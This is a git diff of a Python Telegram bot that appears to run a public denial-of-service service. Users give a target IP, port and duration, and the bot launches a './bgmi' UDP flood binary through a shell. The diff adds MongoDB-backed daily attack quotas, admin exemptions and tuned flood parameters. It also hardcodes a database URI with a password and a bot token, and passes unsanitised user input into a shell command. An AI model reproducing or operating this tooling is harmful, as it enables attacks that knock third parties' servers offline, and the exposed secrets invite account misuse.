@@ -3,50 +3,70 @@ import telebot
 import logging
 import asyncio
 from datetime import datetime, timedelta, timezone
+from pymongo import MongoClient
+
+# MongoDB setup
+MONGO_URI = "mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv"  # Update with your MongoDB URI
+DB_NAME = "udp_flooder"
+COLLECTION_NAME = "user_attacks"
+
+client = MongoClient(MONGO_URI)
+db = client[DB_NAME]
+attack_collection = db[COLLECTION_NAME]
 
 # Initialize logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 # Telegram bot token and group ID
 TOKEN = '7931184714:AAH_FkdQnmVH3th14W7BDkpP0LTZ4DLnM_c'  # Replace with your actual bot token
-GROUP_ID = '-1002191672918'  # Replace with your specific group ID
-CHANNEL_INVITE_LINK = "https://t.me/+lgb92RXeI2E4ZjM1"  # Replace with your private channel invite link
+GROUP_ID = '-1002191672918'
+CHANNEL_INVITE_LINK = "https://t.me/+lgb92RXeI2E4ZjM1"
 bot = telebot.TeleBot(TOKEN)
 
 # Global variables
-user_attacks = {}
-user_cooldowns = {}
-reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
-
-# Attack control variables
+EXEMPTED_USERS = [1342302666, 7286836587]
 COOLDOWN_DURATION = 200
 DAILY_ATTACK_LIMIT = 6
-EXEMPTED_USERS = [1342302666, 1235767855]
 current_attacker = None
 attack_end_time = None
 
 # Users who confirmed they have joined the channel
 joined_users = set()
 
-# Function to reset daily attack limits
+# Function to get current date in string format
+def get_current_date():
+    return datetime.now(timezone.utc).strftime("%Y-%m-%d")
+
+# Function to reset daily attack limits in MongoDB
 def reset_daily_counts():
-    global reset_time
-    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
-    if ist_now >= reset_time + timedelta(days=1):
-        user_attacks.clear()
-        user_cooldowns.clear()
-        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
+    current_date = get_current_date()
+    attack_collection.update_many({}, {"$set": {"attacks": 0, "date": current_date}})
+    logging.info("Daily attack limits reset.")
 
-# Welcome new members
-@bot.message_handler(content_types=['new_chat_members'])
-def welcome_new_member(message):
-    for user in message.new_chat_members:
-        welcome_text = (f"👋 Welcome **{user.first_name}** to the LEGACY VIP group! 🚀\n\n"
-                        "🔥 **Enjoy Free BOT sponsored by ☢️*NINJA MODS*☢️ for its subscribers!**\n"
-                        f"👑 Managed by *@LEGACY4REAL0*")
-        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
+# Function to get user attack count from MongoDB
+def get_user_attacks(user_id):
+    current_date = get_current_date()
+    user = attack_collection.find_one({"user_id": user_id})
 
-# Handle `/joined` command to confirm user has joined the channel
+    if not user or user.get("date") != current_date:
+        attack_collection.update_one(
+            {"user_id": user_id}, 
+            {"$set": {"attacks": 0, "date": current_date}}, 
+            upsert=True
+        )
+        return 0
+
+    return user["attacks"]
+
+# Function to increment user attack count in MongoDB
+def increment_user_attacks(user_id):
+    attack_collection.update_one(
+        {"user_id": user_id},
+        {"$inc": {"attacks": 1}, "$set": {"date": get_current_date()}},
+        upsert=True
+    )
+
+# Handle `/joined` command
 @bot.message_handler(commands=['joined'])
 def confirm_joined(message):
     user_id = message.from_user.id
@@ -72,26 +92,26 @@ def attack_command(message):
 
     # Check if user has joined the private channel
     if user_id not in joined_users:
-        bot.send_message(message.chat.id, f"🚨 You must join the private channel to use this bot. Please join here: {CHANNEL_INVITE_LINK}")
-        bot.send_message(message.chat.id, "After joining, send the command `/joined` to access the bot.")
+        bot.send_message(message.chat.id, f"🚨 You must join the private channel to use this bot. Join here: {CHANNEL_INVITE_LINK}")
+        bot.send_message(message.chat.id, "After joining, send `/joined` to access the bot.")
         return
 
+    # Reset daily limits if needed
     reset_daily_counts()
 
+    # Check if another attack is running
+    if current_attacker:
+        remaining_time = (attack_end_time - datetime.now()).total_seconds() if attack_end_time else 0
+        minutes, seconds = divmod(max(remaining_time, 0), 60)
+        bot.send_message(message.chat.id, f"⚠️ {user_name}, another user is attacking. Wait {int(minutes)}m {int(seconds)}s.")
+        return
+
+    # Check attack limits
     if user_id not in EXEMPTED_USERS:
-        if current_attacker:
-            remaining_time = (attack_end_time - datetime.now()).total_seconds() if attack_end_time else 0
-            minutes, seconds = divmod(max(remaining_time, 0), 60)
-            bot.send_message(message.chat.id, f"⚠️ {user_name}, another user is executing an attack. Please wait {int(minutes)}m {int(seconds)}s.")
-            return
+        user_attacks = get_user_attacks(user_id)
 
-        if user_cooldowns.get(user_id, datetime.min) > datetime.now():
-            remaining_time = (user_cooldowns[user_id] - datetime.now()).seconds
-            bot.send_message(message.chat.id, f"⏳ {user_name}, you are on cooldown. Try again in {remaining_time // 60}m {remaining_time % 60}s.")
-            return
-
-        if user_attacks.get(user_id, 0) >= DAILY_ATTACK_LIMIT:
-            bot.send_message(message.chat.id, f"🚫 {user_name}, you've reached your daily attack limit. Come back tomorrow!")
+        if user_attacks >= DAILY_ATTACK_LIMIT:
+            bot.send_message(message.chat.id, f"🚫 {user_name}, you've reached your daily attack limit. Try again tomorrow!")
             return
 
     try:
@@ -108,9 +128,9 @@ def attack_command(message):
         if not user_duration.isdigit() or int(user_duration) <= 0:
             raise ValueError("❌ Duration must be a positive number.")
 
+        # Increment attack count
         if user_id not in EXEMPTED_USERS:
-            user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
-            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
+            increment_user_attacks(user_id)
 
         current_attacker = user_id
         attack_duration = 120
@@ -121,7 +141,7 @@ def attack_command(message):
             f"🚀 **{user_name}, attack initiated!**\n\n"
             f"🎯 Target: `{target_ip}:{target_port}`\n"
             f"⏳ Duration: {attack_duration}s\n\n"
-            "⚡ **Stay tuned for the results!**"
+            "⚡ **Stay tuned for results!**"
         )
 
         asyncio.run(run_attack_command_async(target_ip, int(target_port), attack_duration, user_name))
@@ -133,7 +153,7 @@ async def run_attack_command_async(target_ip, target_port, duration, user_name):
     global current_attacker, attack_end_time
 
     try:
-        command = f"./bgmi {target_ip} {target_port} {duration} 15 600"
+        command = f"./bgmi {target_ip} {target_port} {duration} {350} {60}"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
 
